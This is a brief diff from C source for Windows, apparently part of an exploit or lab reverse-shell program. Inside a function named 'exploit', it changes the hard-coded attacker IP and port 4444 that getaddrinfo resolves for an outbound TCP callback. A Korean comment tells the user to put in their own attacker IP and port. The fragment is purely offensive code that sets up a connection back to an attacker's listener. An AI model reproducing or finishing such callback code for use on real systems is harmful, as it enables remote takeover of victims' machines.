@@ -42,7 +42,7 @@ DWORD WINAPI exploit(LPVOID lpParam)
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    getaddrinfo("172.30.40.138", "4444", &hints, &result); // 공격자 IP와 포트번호로 수정하기
+    getaddrinfo("192.168.14.135", "4444", &hints, &result); // 공격자 IP와 포트번호로 수정하기
 
     for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
 
